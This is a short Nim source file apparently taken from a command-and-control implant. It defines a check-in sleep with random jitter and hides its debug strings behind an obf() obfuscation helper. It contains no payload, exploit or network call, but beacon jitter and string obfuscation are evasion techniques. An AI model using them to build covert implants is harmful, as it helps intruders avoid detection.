import os
import random

import config 
import utils

var sleepTime*: int = CHECKIN_SLEEP
var jitterTime*: int = CHECKIN_SLEEP_JITTER

randomize()

proc doSleep*(): void =
    var time: int = (sleepTime + rand(jitterTime * -1..jitterTime)) * 1000

    when not defined(release):
        echo obf("Sleeping for ") & $time & obf("ms") 

    sleep(time)
